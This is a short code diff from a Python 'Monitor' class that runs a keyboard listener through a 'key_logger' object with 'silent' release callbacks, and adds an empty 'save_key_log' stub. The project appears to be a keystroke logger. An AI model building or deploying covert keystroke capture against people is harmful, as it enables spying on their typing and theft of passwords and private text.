@@ -18,6 +18,8 @@ class Monitor(object):
                 on_release=self.key_logger.on_release_silent) as listener:
             listener.join()
 
+    def save_key_log(self):
+
     def to_json(self):
         """ Converts all member data into a JSON string
         :return: JSON string
